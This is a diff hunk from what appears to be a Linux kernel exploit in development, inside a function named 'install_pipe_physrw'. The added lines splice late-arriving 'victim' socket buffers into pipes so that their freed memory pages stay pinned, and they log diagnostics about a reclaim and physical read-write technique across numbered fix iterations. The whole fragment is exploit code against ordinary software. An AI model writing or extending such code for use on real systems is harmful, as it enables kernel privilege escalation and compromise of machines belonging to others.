@@ -1563,6 +1563,35 @@ int install_pipe_physrw(int fd) {
         ioctl(reclaim_recv_fd(), SIOCINQ, &q);
         pr_info("win tick +%lds skbrxq=%d base_events=%d dead=%d\n", elapsed,
                 q, ks_watch_frees_events(), tbl_dead_logged);
+        /* fix74b (redo26): a victim skb landing on conn0 AFTER the main
+         * pin window closed sits unpinned in the queue -- splice it now
+         * so its frag page survives; q=1 is the constant 'X' remnant
+         * (skipped).  fix74c: tee-dump the hold pipe's ioctl slot every
+         * other second -- ALIVE after base died proves the pin copied a
+         * different page, ZERO proves the pipe never held it. */
+        if (q > 1) {
+          int remain = q, got = 0;
+          while (remain > 0) {
+            int hp[2] = {-1, -1};
+            if (pipe(hp) != 0)
+              break;
+            size_t chunk = remain > 65536 ? 65536 : (size_t)remain;
+            ssize_t sp = splice(reclaim_recv_fd(), NULL, hp[1], NULL, chunk,
+                                SPLICE_F_NONBLOCK);
+            if (sp <= 0) {
+              close(hp[0]);
+              close(hp[1]);
+              break;
+            }
+            got += (int)sp;
+            remain -= (int)sp;
+            if ((size_t)sp < chunk) break;
+          }
+          if (got > 0)
+            pr_info("fix74b late pin %d bytes at +%lds\n", got, elapsed);
+        }
+        if (elapsed % 2 == 0)
+          ks_hold_dump("wintick");
         /* fix72 (redo15): the flush/release slots get poisoned (0x12) in
          * the seconds after route put with NO chain-side writer in the
          * log (redo10 could not name the writer either), and any SIGKILL
